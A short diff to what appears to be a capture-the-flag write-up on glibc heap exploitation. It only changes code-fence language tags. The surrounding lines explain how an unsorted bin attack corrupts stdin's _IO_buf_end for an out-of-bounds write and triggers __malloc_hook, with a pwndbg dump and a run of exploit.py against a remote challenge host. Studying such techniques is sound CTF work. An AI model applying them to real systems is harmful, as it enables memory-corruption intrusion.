@@ -448,7 +448,7 @@ _IO_new_file_underflow (_IO_FILE *fp)
 ```
 
 The interesting part is the `count = _IO_SYSREAD (fp, fp->_IO_buf_base, fp->_IO_buf_end - fp->_IO_buf_base);` which reads `fp->_IO_buf_end - fp->_IO_buf_base` bytes in `fp->_IO_buf_base`. Which means if `fp->_IO_buf_end` is replaced with the help of an unsorted bin attack by the address of the unsorted bin and that `&unsorted bin > fp->_IO_buf_base`, we can trigger an out of bound write from a certain address up to the address of the unsorted bin. We can inspect the layout in gdb to see what's actually going on:
-```
+```bash
 pwndbg> x/100gx stdin
 0x7ffff7dcfa00 <_IO_2_1_stdin_>:	0x00000000fbad208b	0x00007ffff7dcfa83
 0x7ffff7dcfa10 <_IO_2_1_stdin_+16>:	0x00007ffff7dcfa83	0x00007ffff7dcfa83
@@ -735,7 +735,7 @@ constraints:
 The `4\n\x00\x00\x00` corresponds to the option that asks for the huge chunk (we cannot allocate standards chunks anymore) which will trigger `__malloc_hook` :).
 
 Which gives:
-```
+```bash
 root@3b9bf5405b71:/mnt# python3 exploit.py REMOTE HOST=167.172.56.180 PORT=30332
 [*] '/mnt/once_and_for_all'
     Arch:     amd64-64-little
